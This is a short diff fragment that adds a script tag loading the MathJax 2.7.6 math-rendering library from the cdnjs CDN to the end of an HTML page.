+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
